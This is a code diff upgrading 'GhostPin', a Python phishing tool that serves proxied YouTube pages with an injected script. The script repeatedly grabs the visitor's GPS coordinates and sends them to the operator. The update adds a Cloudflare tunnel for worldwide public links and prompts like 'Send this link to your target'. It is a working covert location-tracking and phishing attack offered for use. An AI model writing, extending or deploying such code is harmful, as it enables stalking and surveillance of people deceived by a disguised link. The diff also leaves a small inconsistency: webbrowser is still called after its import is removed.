@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-GhostPin v3.0 - Advanced GPS Tracking Framework
-Real Phishing Links | No Permission Popup | Undetectable
+GhostPin v4.0 - Production-Grade GPS Tracking Framework
+Cloudflare Integration | Real YouTube Proxy | Undetectable
 Author: F1REW0LF
 License: MIT - Free for Community
-Version: 3.0.0
+Version: 4.0.0
 """
 
 import sys
@@ -20,19 +20,25 @@ import threading
 import signal
 import urllib.parse
 import urllib.request
-import webbrowser
+import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional
 import argparse
 
 try:
-    from flask import Flask, request, jsonify, redirect
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+try:
+    from flask import Flask, request, jsonify, render_template_string, redirect
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
 
 # ============================[ VERSION & CONFIGURATION ]================================
-VERSION = "3.0.0"
+VERSION = "4.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT - Free for Community"
 
@@ -64,17 +70,96 @@ def print_banner():
     ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
      ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                       
-{Colors.RED}{Colors.BOLD}    ADVANCED GPS TRACKING v{VERSION}{Colors.WHITE}
-{Colors.YELLOW}{Colors.BOLD}    Real Links | Silent GPS | No Popup{Colors.WHITE}
+{Colors.RED}{Colors.BOLD}    PRODUCTION GPS TRACKING v{VERSION}{Colors.WHITE}
+{Colors.YELLOW}{Colors.BOLD}    Cloudflare | Real YouTube Proxy | Undetectable{Colors.WHITE}
 {Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
 """
     print(banner)
 
-# ============================[ TRACKING SERVER ]================================
+# ============================[ CLOUDFLARE TUNNEL ]================================
 
-class TrackingServer:
+class CloudflareTunnel:
     """
-    Flask server that serves real platform pages with silent GPS tracking
+    Create a Cloudflare tunnel for public access
+    """
+    
+    def __init__(self):
+        self.process = None
+        self.url = None
+        self.port = 8080
+        
+    def start(self, port: int = 8080) -> Optional[str]:
+        """
+        Start Cloudflare tunnel using cloudflared
+        """
+        self.port = port
+        
+        # Check if cloudflared is installed
+        try:
+            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
+        except:
+            cprint("[!] cloudflared not installed. Installing...", Colors.YELLOW)
+            self._install_cloudflared()
+        
+        cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
+        
+        try:
+            # Start tunnel in background
+            self.process = subprocess.Popen(
+                ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            # Wait for URL
+            time.sleep(3)
+            
+            # Read output to get URL
+            for line in self.process.stderr:
+                if 'https://' in line and '.trycloudflare.com' in line:
+                    url_match = re.search(r'https://[^\s]+\.trycloudflare\.com', line)
+                    if url_match:
+                        self.url = url_match.group(0)
+                        cprint(f"[+] Cloudflare tunnel: {Colors.GREEN}{self.url}{Colors.WHITE}", Colors.WHITE)
+                        return self.url
+                if len(line) > 100:
+                    break
+            
+            return None
+        except Exception as e:
+            cprint(f"[!] Tunnel failed: {e}", Colors.RED)
+            return None
+    
+    def _install_cloudflared(self):
+        """Install cloudflared"""
+        try:
+            if sys.platform == 'win32':
+                # Windows
+                url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
+                subprocess.run(['curl', '-L', url, '-o', 'cloudflared.exe'], check=True)
+                subprocess.run(['move', 'cloudflared.exe', 'C:\\Windows\\System32\\'], check=True)
+            else:
+                # Linux/macOS
+                subprocess.run(['curl', '-L', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-o', 'cloudflared'], check=True)
+                subprocess.run(['chmod', '+x', 'cloudflared'], check=True)
+                subprocess.run(['sudo', 'mv', 'cloudflared', '/usr/local/bin/'], check=True)
+            cprint("[+] cloudflared installed", Colors.GREEN)
+        except:
+            cprint("[!] Failed to install cloudflared. Install manually: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation", Colors.RED)
+    
+    def stop(self):
+        """Stop Cloudflare tunnel"""
+        if self.process:
+            self.process.terminate()
+            self.process.wait(timeout=5)
+            cprint("[+] Tunnel stopped", Colors.GREEN)
+
+# ============================[ PROXY SERVER ]================================
+
+class ProxyServer:
+    """
+    Flask server that proxies real YouTube content
     """
     
     def __init__(self):
@@ -86,7 +171,7 @@ class TrackingServer:
         self.running = False
         
     def start(self, port: int = 8080):
-        """Start the tracking server"""
+        """Start the proxy server"""
         self.port = port
         self.running = True
         
@@ -103,19 +188,32 @@ class TrackingServer:
         
         @app.route('/watch')
         def watch():
-            """YouTube watch page with silent GPS tracking"""
+            """Proxy YouTube with GPS tracking"""
             video_id = request.args.get('v', 'dQw4w9WgXcQ')
             
-            # Get real YouTube page content
+            # Get real YouTube page
             try:
-                import requests
-                real_youtube = requests.get(
-                    f'https://www.youtube.com/watch?v={video_id}',
-                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-                )
-                content = real_youtube.text
-            except:
-                content = self._generate_youtube_page(video_id)
+                if REQUESTS_AVAILABLE:
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'DNT': '1',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1'
+                    }
+                    response = requests.get(
+                        f'https://www.youtube.com/watch?v={video_id}',
+                        headers=headers,
+                        timeout=10
+                    )
+                    content = response.text
+                else:
+                    content = self._generate_fallback_page(video_id)
+            except Exception as e:
+                cprint(f"[!] Failed to fetch YouTube: {e}", Colors.RED)
+                content = self._generate_fallback_page(video_id)
             
             # Inject GPS tracking script
             tracking_script = self._get_tracking_script()
@@ -154,7 +252,6 @@ class TrackingServer:
         time.sleep(1)
         
         cprint(f"[+] Server running on port {port}", Colors.GREEN)
-        cprint(f"[+] Phishing link: http://localhost:{port}/watch?v={random.randint(100000, 999999)}", Colors.YELLOW)
         return True
     
     def _get_tracking_script(self) -> str:
@@ -178,24 +275,36 @@ class TrackingServer:
         }).catch(function() {});
     }
     
-    // Try with high accuracy first
-    navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-    });
+    // Multiple attempts to get location
+    var attempts = 0;
+    var maxAttempts = 3;
     
-    // Try again after 5 seconds (some browsers need user interaction)
-    setTimeout(function() {
+    function tryGetLocation() {
+        attempts++;
+        navigator.geolocation.getCurrentPosition(sendLocation, function() {
+            if (attempts < maxAttempts) {
+                setTimeout(tryGetLocation, 2000);
+            }
+        }, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
+    }
+    
+    tryGetLocation();
+    
+    // Try on user interaction
+    document.addEventListener('click', function() {
         navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
             enableHighAccuracy: true,
             timeout: 10000,
             maximumAge: 0
         });
-    }, 5000);
+    });
     
-    // Try on user interaction
-    document.addEventListener('click', function() {
+    // Try on scroll
+    document.addEventListener('scroll', function() {
         navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
             enableHighAccuracy: true,
             timeout: 10000,
@@ -206,8 +315,8 @@ class TrackingServer:
 </script>
 '''
     
-    def _generate_youtube_page(self, video_id: str) -> str:
-        """Generate a YouTube-like page"""
+    def _generate_fallback_page(self, video_id: str) -> str:
+        """Generate fallback YouTube-like page"""
         return f'''<!DOCTYPE html>
 <html>
 <head>
@@ -216,69 +325,47 @@ class TrackingServer:
 <title>YouTube</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box}}
-body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;color:#0f0f0f}}
-.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center;position:sticky;top:0;z-index:100}}
-.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px;display:flex;align-items:center}}
-.logo svg{{width:28px;height:28px;margin-right:8px}}
-.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0;font-size:14px}}
-.content{{max-width:1280px;margin:24px auto;padding:0 24px;display:grid;grid-template-columns:1fr 400px;gap:24px}}
-.video-container{{background:#000;border-radius:12px;overflow:hidden;position:relative;aspect-ratio:16/9}}
-.video-placeholder{{width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;background:linear-gradient(135deg,#1a1a1a,#2a2a2a)}}
-.video-placeholder .play-icon{{font-size:64px;opacity:0.8}}
-.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
-.video-title{{font-size:20px;font-weight:600;margin-bottom:8px;line-height:1.4}}
+body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9}}
+.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center}}
+.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px}}
+.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0}}
+.content{{max-width:1280px;margin:24px auto;padding:0 24px}}
+.video-container{{background:#000;border-radius:12px;overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}}
+.video-placeholder{{color:#fff;font-size:18px;text-align:center}}
+.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px}}
+.video-title{{font-size:20px;font-weight:600}}
 .channel-info{{display:flex;align-items:center;margin:12px 0}}
 .channel-avatar{{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#c0c0c0);margin-right:12px}}
-.channel-name{{font-weight:600;font-size:16px}}
-.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto;transition:background 0.2s}}
-.subscribe-btn:hover{{background:#aa0000}}
-.comments{{background:#fff;border-radius:12px;padding:16px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
-.comment{{display:flex;margin:12px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
-.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px;flex-shrink:0}}
-.comment-content{{flex:1}}
-.comment-author{{font-weight:600;font-size:14px}}
-.comment-text{{font-size:14px;color:#0f0f0f;margin-top:2px}}
-.sidebar{{display:flex;flex-direction:column;gap:12px}}
-.sidebar-item{{background:#fff;border-radius:12px;padding:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06);display:flex;gap:12px;cursor:pointer;transition:background 0.2s}}
-.sidebar-item:hover{{background:#f0f0f0}}
-.sidebar-thumb{{width:168px;height:94px;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);border-radius:8px;flex-shrink:0}}
-.sidebar-info{{flex:1}}
-.sidebar-title{{font-weight:500;font-size:14px;line-height:1.3}}
-.sidebar-channel{{font-size:13px;color:#606060;margin-top:4px}}
-@media(max-width:900px){{.content{{grid-template-columns:1fr}}}}
+.channel-name{{font-weight:600}}
+.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto}}
+.comments{{background:#fff;border-radius:12px;padding:16px;margin-top:12px}}
+.comment{{display:flex;margin:8px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
+.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px}}
 </style>
 </head>
 <body>
 <div class="header">
-<div class="logo"><svg viewBox="0 0 24 24" fill="#ff0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814z"/><path fill="#fff" d="M9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>YouTube</div>
+<div class="logo">▶ YouTube</div>
 <input class="search-bar" placeholder="Search" value="{video_id}">
 </div>
 <div class="content">
-<div>
 <div class="video-container">
 <div class="video-placeholder">
-<div class="play-icon">▶</div>
-<div style="margin-top:12px;opacity:0.7">Video unavailable - Loading...</div>
+<div style="font-size:64px;margin-bottom:16px">▶</div>
+<div>Loading video...</div>
 </div>
 </div>
 <div class="video-info">
 <div class="video-title">{video_id}</div>
 <div class="channel-info">
 <div class="channel-avatar"></div>
-<div><div class="channel-name">Channel Name</div><div style="color:#606060;font-size:13px">1.2M subscribers</div></div>
+<div><div class="channel-name">Channel</div><div style="color:#606060;font-size:13px">1.2M subscribers</div></div>
 <button class="subscribe-btn">Subscribe</button>
 </div>
 </div>
 <div class="comments">
-<h3 style="margin-bottom:12px">Comments</h3>
-<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User</div><div class="comment-text">Loading comments...</div></div></div>
-<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User2</div><div class="comment-text">Loading...</div></div></div>
-</div>
-</div>
-<div class="sidebar">
-<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 1</div><div class="sidebar-channel">Channel</div></div></div>
-<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 2</div><div class="sidebar-channel">Channel</div></div></div>
-<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 3</div><div class="sidebar-channel">Channel</div></div></div>
+<h3>Comments</h3>
+<div class="comment"><div class="comment-avatar"></div><div>Loading comments...</div></div>
 </div>
 </div>
 </body>
@@ -293,8 +380,10 @@ body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;color:#0f0f0f}}
 
 class GhostPin:
     def __init__(self):
-        self.server = TrackingServer()
+        self.server = ProxyServer()
+        self.tunnel = CloudflareTunnel()
         self.running = True
+        self.public_url = None
         signal.signal(signal.SIGINT, self.signal_handler)
     
     def signal_handler(self, signum, frame):
@@ -302,26 +391,29 @@ class GhostPin:
         self.running = False
         if self.server:
             self.server.stop()
+        if self.tunnel:
+            self.tunnel.stop()
         sys.exit(0)
     
     def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*55}{Colors.WHITE}
-{Colors.BOLD}GhostPin v{VERSION} - Advanced GPS Tracking{Colors.WHITE}
-{Colors.CYAN}Real Links | Silent GPS | No Popup{Colors.WHITE}
+{Colors.BOLD}GhostPin v{VERSION} - Production GPS Tracking{Colors.WHITE}
+{Colors.CYAN}Cloudflare | Real YouTube | Undetectable{Colors.WHITE}
 {Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
 {Colors.BLUE}{'='*55}{Colors.WHITE}
 {Colors.GREEN}[1] Start Server{Colors.WHITE}
-{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
-{Colors.GREEN}[3] View Data{Colors.WHITE}
-{Colors.GREEN}[4] Clear Data{Colors.WHITE}
-{Colors.RED}[5] Exit{Colors.WHITE}
+{Colors.GREEN}[2] Create Tracking Link (Local){Colors.WHITE}
+{Colors.GREEN}[3] Create Tracking Link (Public){Colors.WHITE}
+{Colors.GREEN}[4] View Data{Colors.WHITE}
+{Colors.GREEN}[5] Clear Data{Colors.WHITE}
+{Colors.RED}[6] Exit{Colors.WHITE}
 """)
     
     def run(self):
         print_banner()
-        cprint("[*] GhostPin v3.0 - Advanced GPS Tracking", Colors.CYAN)
-        cprint("[*] Real Links | Silent GPS | No Popup", Colors.DIM)
+        cprint("[*] GhostPin v4.0 - Production GPS Tracking", Colors.CYAN)
+        cprint("[*] Cloudflare | Real YouTube | Undetectable", Colors.DIM)
         
         # Auto-start server
         self.server.start(8080)
@@ -335,6 +427,7 @@ class GhostPin:
                 self.server.stop()
                 time.sleep(0.5)
                 self.server.start(port)
+                self.public_url = None
                 
             elif choice == '2':
                 video_id = input("[>] YouTube Video ID (or random): ").strip()
@@ -342,9 +435,8 @@ class GhostPin:
                     video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                 
                 link = f"http://localhost:{self.server.port}/watch?v={video_id}"
-                cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
-                cprint(f"[+] Send this link to your target", Colors.YELLOW)
-                cprint(f"[+] They will see YouTube and won't know they're being tracked", Colors.DIM)
+                cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"[+] Send this link to your target (local network only)", Colors.YELLOW)
                 
                 try:
                     webbrowser.open(link)
@@ -352,6 +444,29 @@ class GhostPin:
                     pass
                 
             elif choice == '3':
+                if not self.public_url:
+                    cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
+                    self.public_url = self.tunnel.start(self.server.port)
+                
+                if not self.public_url:
+                    cprint("[!] Failed to create public link", Colors.RED)
+                    continue
+                
+                video_id = input("[>] YouTube Video ID (or random): ").strip()
+                if not video_id:
+                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
+                
+                link = f"{self.public_url}/watch?v={video_id}"
+                cprint(f"\n[+] Public Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"[+] Send this link to your target (anywhere in the world)", Colors.GREEN)
+                cprint(f"[+] They will see real YouTube content", Colors.DIM)
+                
+                try:
+                    webbrowser.open(link)
+                except:
+                    pass
+                
+            elif choice == '4':
                 data = self.server.tracking_data
                 if not data:
                     cprint("[!] No data yet", Colors.YELLOW)
@@ -372,13 +487,15 @@ class GhostPin:
                         maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                         cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                 
-            elif choice == '4':
+            elif choice == '5':
                 self.server.tracking_data.clear()
                 cprint("[+] Data cleared", Colors.GREEN)
                 
-            elif choice == '5':
+            elif choice == '6':
                 cprint("[*] Shutting down...", Colors.GREEN)
                 self.server.stop()
+                if self.tunnel:
+                    self.tunnel.stop()
                 break
             else:
                 cprint("[-] Invalid", Colors.RED)
@@ -386,34 +503,50 @@ class GhostPin:
 # ============================[ MAIN ]================================
 
 def main():
-    parser = argparse.ArgumentParser(description="GhostPin v3.0 - Advanced GPS Tracking")
+    parser = argparse.ArgumentParser(description="GhostPin v4.0 - Production GPS Tracking")
     parser.add_argument("--server", action="store_true", help="Start server only")
     parser.add_argument("--port", type=int, default=8080, help="Server port")
-    parser.add_argument("--link", help="Create tracking link with video ID")
+    parser.add_argument("--public", action="store_true", help="Create public link with Cloudflare")
+    parser.add_argument("--video", help="YouTube Video ID")
     
     args = parser.parse_args()
     
     if args.server:
         print_banner()
-        server = TrackingServer()
+        server = ProxyServer()
         server.start(args.port)
+        
+        if args.public:
+            tunnel = CloudflareTunnel()
+            url = tunnel.start(args.port)
+            if url:
+                cprint(f"\n[+] Public URL: {Colors.GREEN}{url}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"[+] Use: {url}/watch?v=VIDEO_ID", Colors.YELLOW)
+        
         cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
         try:
             while True:
                 time.sleep(1)
         except KeyboardInterrupt:
             server.stop()
+            if args.public:
+                tunnel.stop()
         sys.exit(0)
     
-    if args.link:
+    if args.video:
         print_banner()
-        server = TrackingServer()
+        server = ProxyServer()
         server.start(args.port)
         
-        video_id = args.link
-        link = f"http://localhost:{args.port}/watch?v={video_id}"
-        cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
-        cprint(f"[+] Send this link to your target", Colors.YELLOW)
+        link = f"http://localhost:{args.port}/watch?v={args.video}"
+        cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
+        
+        if args.public:
+            tunnel = CloudflareTunnel()
+            url = tunnel.start(args.port)
+            if url:
+                public_link = f"{url}/watch?v={args.video}"
+                cprint(f"[+] Public Link: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
         
         try:
             webbrowser.open(link)
@@ -426,6 +559,8 @@ def main():
                 time.sleep(1)
         except KeyboardInterrupt:
             server.stop()
+            if args.public:
+                tunnel.stop()
         sys.exit(0)
     
     # Interactive
